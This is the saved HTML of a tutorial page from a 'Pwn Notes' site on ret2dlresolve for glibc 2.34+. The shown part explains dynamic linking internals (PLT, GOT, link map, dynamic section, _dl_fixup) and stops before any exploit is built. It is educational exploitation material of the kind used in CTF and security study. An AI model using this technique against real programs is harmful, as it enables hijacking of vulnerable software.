<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-pwn/rop-2.34+/dlrop" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">dlrop | Pwn Notes</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://0xa5h.com/pwn/rop-2.34+/dlrop"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="dlrop | Pwn Notes"><meta data-rh="true" name="description" content=" "><meta data-rh="true" property="og:description" content=" "><link data-rh="true" rel="icon" href="/img/sunglas.png"><link data-rh="true" rel="canonical" href="https://0xa5h.com/pwn/rop-2.34+/dlrop"><link data-rh="true" rel="alternate" href="https://0xa5h.com/pwn/rop-2.34+/dlrop" hreflang="en"><link data-rh="true" rel="alternate" href="https://0xa5h.com/pwn/rop-2.34+/dlrop" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"pwn","item":"https://0xa5h.com/category/pwn"},{"@type":"ListItem","position":2,"name":"ROP 2.34+","item":"https://0xa5h.com/category/rop-234"},{"@type":"ListItem","position":3,"name":"dlrop","item":"https://0xa5h.com/pwn/rop-2.34+/dlrop"}]}</script><link rel="stylesheet" href="/assets/css/styles.985557f3.css">
<script src="/assets/js/runtime~main.52b18a9b.js" defer="defer"></script>
<script src="/assets/js/main.051e1bb5.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/sunglas.png"><link rel="preload" as="image" href="/assets/image (1).png"><link rel="preload" as="image" href="/assets/image (2).png"><link rel="preload" as="image" href="/assets/image (3).png"><link rel="preload" as="image" href="/assets/image (4).png"><link rel="preload" as="image" href="/assets/image (5).png"><link rel="preload" as="image" href="/assets/_dl_runtime_resolve_xsavec.png"><link rel="preload" as="image" href="/assets/image (15).png"><link rel="preload" as="image" href="/assets/image (16).png"><link rel="preload" as="image" href="/assets/image (17).png"><link rel="preload" as="image" href="/assets/image (21).png"><link rel="preload" as="image" href="/assets/Screenshot 2025-06-18 003723.png"><link rel="preload" as="image" href="/assets/image (237).png"><link rel="preload" as="image" href="/assets/image (238).png"><link rel="preload" as="image" href="/assets/image (239).png"><link rel="preload" as="image" href="/assets/image (240).png"><link rel="preload" as="image" href="/assets/image (8).png"><link rel="preload" as="image" href="/assets/image (9).png"><link rel="preload" as="image" href="/assets/image (23).png"><link rel="preload" as="image" href="/assets/image (24).png"><link rel="preload" as="image" href="/assets/Screenshot 2025-07-12 220401.png"><link rel="preload" as="image" href="/assets/image (10).png"><link rel="preload" as="image" href="/assets/image (232).png"><link rel="preload" as="image" href="/assets/image (234).png"><link rel="preload" as="image" href="/assets/image (233).png"><link rel="preload" as="image" href="/assets/Screenshot 2025-07-22 230859.png"><link rel="preload" as="image" href="/assets/image.png"><link rel="preload" as="image" href="/assets/image (11).png"><link rel="preload" as="image" href="/assets/image (12).png"><link rel="preload" as="image" href="/assets/image (13).png"><link rel="preload" as="image" href="/assets/image (14).png"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/sunglas.png" alt="sunglas" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/sunglas.png" alt="sunglas" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Pwn Notes</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/">Notes</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/sasha-999" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/category/pwn">pwn</a><button aria-label="Collapse sidebar category &#x27;pwn&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/category/rop-234">ROP 2.34+</a><button aria-label="Collapse sidebar category &#x27;ROP 2.34+&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/pwn/rop-2.34+/the-problem">The problem</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/pwn/rop-2.34+/ret2gets">ret2gets</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/pwn/rop-2.34+/controlling-rbp">Controlling rbp</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/pwn/rop-2.34+/controlling-rax">Controlling rax</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/pwn/rop-2.34+/dlrop">dlrop</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/pwn/rop-2.34+/other-gadgets">Other gadgets</a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/pwn/setcontext">setcontext</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/pwn/fork_gadget">fork_gadget</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/category/ctf-writeups">CTF writeups</a><button aria-label="Expand sidebar category &#x27;CTF writeups&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/category/test">Test</a><button aria-label="Expand sidebar category &#x27;Test&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/category/pwn"><span>pwn</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/category/rop-234"><span>ROP 2.34+</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">dlrop</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>dlrop</h1></header>
<p>Another ROP classic is the ret2dlresolve, which allows an attacker to call arbitrary functions in libc without needing the base address, which involves abusing the dynamic linker responsible for resolving functions into the GOT at runtime.</p>
<p>You may have seen this used in combination with gadgets (like our beloved <code>pop rdi ; ret</code>) from the binary before, however given our current predicament, that simply won&#x27;t do!</p>
<p>So here&#x27;s 2 ways to use ret2dlresolve beyond 2.34.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="classic-ret2dlresolve">Classic ret2dlresolve<a href="#classic-ret2dlresolve" class="hash-link" aria-label="Direct link to Classic ret2dlresolve" title="Direct link to Classic ret2dlresolve">​</a></h2>
<p>But first, an introduction to ret2dlresolve, cos why not.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="shared-libraries">Shared libraries<a href="#shared-libraries" class="hash-link" aria-label="Direct link to Shared libraries" title="Direct link to Shared libraries">​</a></h3>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">hello_world.c</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Hello world&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>Let&#x27;s take the very simple program above and compile it normally: <code>gcc hello_world.c -o hello_world</code>. Clearly it will print <code>Hello world</code> by calling <code>puts</code>, but from this program&#x27;s perspective, what even is <code>puts</code>? After all, we haven&#x27;t defined it ourselves. Instead we&#x27;re calling upon the standard C library (glibc on linux), which has implemented it for us.</p>
<p>So how does the program use this? One way is compiling the program along with the code for <code>puts</code> embedded in it (i.e. static binaries), however this will make programs larger than they perhaps need to be. While it won&#x27;t make much of a difference here, it can for much larger programs.</p>
<p>The preferred way is to have a single binary (a shared library) containing all the code for functions in the standard library, then the <code>hello_world.c</code> program can borrow the functions it needs, like <code>puts</code>, that way there&#x27;s less duplicated code across every binary.</p>
<p>For <code>puts</code>, and many other functions, this binary will be <code>libc.so.6</code>. This will be loaded into <code>hello_world</code>&#x27;s memory, so that all its functions are available to the program, not just <code>puts</code>.</p>
<p>So then, how does it know where <code>puts</code> is?</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="plt-and-got">PLT and GOT<a href="#plt-and-got" class="hash-link" aria-label="Direct link to PLT and GOT" title="Direct link to PLT and GOT">​</a></h3>
<p>It does this using the PLT  and the GOT (Global Offset Table).</p>
<p>The PLT (or Procedure Linkage Table :nerd:) is a &quot;table&quot; of small functions, where each one corresponds to an external function used by the program, such as <code>puts</code> in our case. Instead of calling <code>puts</code> directly, it will instead call its corresponding entry, named <code>puts@plt</code>, which will then redirect to <code>puts</code> itself. It does this by resolving (i.e. finding) the function, then jumping to it.</p>
<p>The GOT (or Global Offset Table :nerd::nerd:) is used alongside the PLT, as a sort of cache. Once a function has been resolved, it doesn&#x27;t need to resolve it every time, because that would be expensive, so the address of the function is stored in the GOT, for quick access on the next call.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="puts-plt">puts@plt<a href="#puts-plt" class="hash-link" aria-label="Direct link to puts@plt" title="Direct link to puts@plt">​</a></h4>
<p>Let&#x27;s see how this is handled:</p>
<figure><img src="/assets/image (1).png" alt=""><figcaption><p>Calling puts@plt</p></figcaption></figure>
<p>Disassembling main, we find it calls <code>puts@plt</code>: the PLT entry for <code>puts</code>.</p>
<figure><img src="/assets/image (2).png" alt=""><figcaption><p>puts@plt</p></figcaption></figure>
<figure><img src="/assets/image (3).png" alt=""><figcaption><p><a href="mailto:puts@got.plt" target="_blank" rel="noopener noreferrer">puts@got.plt</a></p></figcaption></figure>
<p>It will first jump to an address stored in <code>puts@got.plt</code>, which is <code>puts</code>&#x27;s corresponding GOT entry. Since <code>puts</code> hasn&#x27;t been called (and thus resolved) yet, this will initially contain the next instruction in <code>puts@plt</code> (<code>0x1036</code>), so that it continues with <code>puts@plt</code>.</p>
<p>This then pushes <code>0</code>, which is the &quot;unique index&quot; for this function (we&#x27;ll come back to this in a moment), and jumps to 0x1020.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="0x1020-dispatcher">0x1020: dispatcher<a href="#0x1020-dispatcher" class="hash-link" aria-label="Direct link to 0x1020: dispatcher" title="Direct link to 0x1020: dispatcher">​</a></h4>
<figure><img src="/assets/image (4).png" alt=""><figcaption><p>0x1020: Dispatcher gadget</p></figcaption></figure>
<p>This gadget will then do 2 things: push the binary&#x27;s <strong>link map</strong> (stored at <code>0x3ff0</code>) and jump to <code>_dl_runtime_resolve_xsavec</code>:</p>
<figure><img src="/assets/image (5).png" alt=""><figcaption><p>_dl_runtime_resolve_xsavec</p></figcaption></figure>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="link-map">link map<a href="#link-map" class="hash-link" aria-label="Direct link to link map" title="Direct link to link map">​</a></h4>
<p>A <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/include/link.h#L95" target="_blank" rel="noopener noreferrer">link map</a> is an object which stores information about a loaded object, such as shared libraries like <code>libc.so.6</code>, or the current program. Each has a link map, and they&#x27;re linked together. These store information such as the base address, the name of the object, where the symbols are etc. This is where all the magic happens, as it contains all the information necessary to resolve a function, like <code>puts</code>. Using the program&#x27;s link map, it can find the object (i.e. library) containing the desired function, and find the address of the function within it.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="dl_runtime_resolve_xsavec">_dl_runtime_resolve_xsavec<a href="#dl_runtime_resolve_xsavec" class="hash-link" aria-label="Direct link to _dl_runtime_resolve_xsavec" title="Direct link to _dl_runtime_resolve_xsavec">​</a></h3>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/x86_64/dl-trampoline.h#L60" target="_blank" rel="noopener noreferrer">_dl_runtime_resolve_xsavec</a> is a function that takes the 2 (stack) arguments we saw before: link map and &quot;unique index&quot;, and aims to use these to find the function and call it, with the arguments provided earlier (i.e. the string <code>Hello world</code>).</p>
<p>The function may look intimidating, but all it does is:</p>
<ol>
<li>Save the current state, including the 6 register arguments to the stack.</li>
<li>Call <code>_dl_fixup</code> to resolve the function (storing it in <code>r11</code>), using the link map and index (this will clobber the registers, hence the saving/restoring).</li>
<li>Restore the state, including the 6 arguments into the registers.</li>
<li>Jump to the function in <code>r11</code>.</li>
</ol>
<figure><img src="/assets/_dl_runtime_resolve_xsavec.png" alt=""><figcaption></figcaption></figure>
<p>So now, how does <code>_dl_fixup</code> work?</p>
<p>Before we get into that, we first need to cover some details about the ELF&#x27;s dynamic section.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="dynamic-section">Dynamic section<a href="#dynamic-section" class="hash-link" aria-label="Direct link to Dynamic section" title="Direct link to Dynamic section">​</a></h3>
<p>The dynamic section stores a list of key-value pairs, storing information relevant to the dynamic linking process we&#x27;re interested in, such as needed libraries, symbol tables, string tables etc.</p>
<figure><img src="/assets/image (15).png" alt=""><figcaption><p>Dynamic section of <code>hello_world</code></p></figcaption></figure>
<p>From the above, we&#x27;re particularly interested in the following three.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="dt_symtab">DT_SYMTAB<a href="#dt_symtab" class="hash-link" aria-label="Direct link to DT_SYMTAB" title="Direct link to DT_SYMTAB">​</a></h4>
<p>This is the <em>dynamic</em> symbol table, i.e. the <code>.dynsym</code> section (not to be confused with <code>.symtab</code>). This stores an array of <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/elf.h#L535" target="_blank" rel="noopener noreferrer">Elf64_Sym</a> objects:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">typedef</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Elf64_Word	st_name</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">		</span><span class="token comment" style="color:#999988;font-style:italic">/* Symbol name (string tbl index) */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain">	st_info</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">		</span><span class="token comment" style="color:#999988;font-style:italic">/* Symbol type and binding */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> st_other</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">		</span><span class="token comment" style="color:#999988;font-style:italic">/* Symbol visibility */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Elf64_Section	st_shndx</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">		</span><span class="token comment" style="color:#999988;font-style:italic">/* Section index */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Elf64_Addr	st_value</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">		</span><span class="token comment" style="color:#999988;font-style:italic">/* Symbol value */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Elf64_Xword	st_size</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">		</span><span class="token comment" style="color:#999988;font-style:italic">/* Symbol size */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> Elf64_Sym</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>While <code>.symtab</code> stores the symbols in the program itself, <code>.dynsym</code> stores information about <em>external</em> symbols, such as <code>puts</code>:</p>
<figure><img src="/assets/image (16).png" alt=""><figcaption><p><code>.dynsym</code></p></figcaption></figure>
<p>Unlike in <code>.symtab</code>, <code>st_value</code> won&#x27;t (usually) contain a value (as it doesn&#x27;t know where it is), so the most significant field to keep in mind is <code>st_name</code>, which points to the string for the name using an offset into the string table.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="dt_strtab">DT_STRTAB<a href="#dt_strtab" class="hash-link" aria-label="Direct link to DT_STRTAB" title="Direct link to DT_STRTAB">​</a></h4>
<p>This is simply a list of null-terminated strings, specifcally the one for <em>dynamic</em> symbols (i.e. <code>.dynstr</code> not <code>.strtab</code>). Symbols in <code>.dynsym</code> reference a string here using an offset.</p>
<figure><img src="/assets/image (17).png" alt=""><figcaption><p><code>.dynstr</code></p></figcaption></figure>
<p>So for example, the <code>puts</code> symbol would have <code>st_name=1</code>.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="dt_jmprel">DT_JMPREL<a href="#dt_jmprel" class="hash-link" aria-label="Direct link to DT_JMPREL" title="Direct link to DT_JMPREL">​</a></h4>
<p>This is the relocation table for external functions (i.e. <code>.rela.plt</code>), and is the most important section for resolving symbols. This stores a list of <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/elf.h#L663" target="_blank" rel="noopener noreferrer">Elf64_Rela</a> objects:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">typedef</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Elf64_Addr	r_offset</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">		</span><span class="token comment" style="color:#999988;font-style:italic">/* Address */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Elf64_Xword	r_info</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">			</span><span class="token comment" style="color:#999988;font-style:italic">/* Relocation type and symbol index */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Elf64_Sxword	r_addend</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">		</span><span class="token comment" style="color:#999988;font-style:italic">/* Addend */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> Elf64_Rela</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<ul>
<li><code>r_offset</code> stores where the GOT entry is located (i.e. where the function address should be written to when it&#x27;s resolved).</li>
<li><code>r_info</code> stores both which symbol this entry refers to (an index into <code>.dynsym</code>) and what type of relocation it is. For our purposes, we&#x27;ll look at resolving functions, so the type will be <code>R_X86_64_JUMP_SLOT</code>.</li>
<li><code>r_addend</code> isn&#x27;t used, so we can usually ignore it. However what it <em>would</em> do is add an offset onto the end of the function address.</li>
</ul>
<figure><img src="/assets/image (21).png" alt=""><figcaption><p><code>.rela.plt</code></p></figcaption></figure>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="dl_fixup">_dl_fixup<a href="#dl_fixup" class="hash-link" aria-label="Direct link to _dl_fixup" title="Direct link to _dl_fixup">​</a></h3>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L41" target="_blank" rel="noopener noreferrer">_dl_fixup</a> will do 2 things:</p>
<ol>
<li>Resolve the function and return its address.</li>
<li>Write that address to its corresponding GOT entry.</li>
</ol>
<p>This function is quite complex, so we won&#x27;t cover all of it: just what&#x27;s needed for us.</p>
<figure><img src="/assets/Screenshot 2025-06-18 003723.png" alt=""><figcaption><p><code>_dl_fixup</code></p></figcaption></figure>
<p>It takes 2 arguments: the link map, and that unique symbol index I mentioned earlier. <code>_dl_fixup</code> calls it the <code>reloc_arg</code>, and that&#x27;s because it&#x27;s used as an index into the relocation table (<code>DT_JMPREL</code>) to get the <code>reloc</code> object.</p>
<p>By getting the <code>reloc-&gt;r_info</code>, you can find the corresponding symbol (<code>sym</code>) in <code>DT_SYMTAB</code>, and with <code>reloc-&gt;r_offset</code> you can find the address of GOT (<code>rel_addr</code>).</p>
<figure><img src="/assets/image (237).png" alt=""><figcaption><p>Check visibility</p></figcaption></figure>
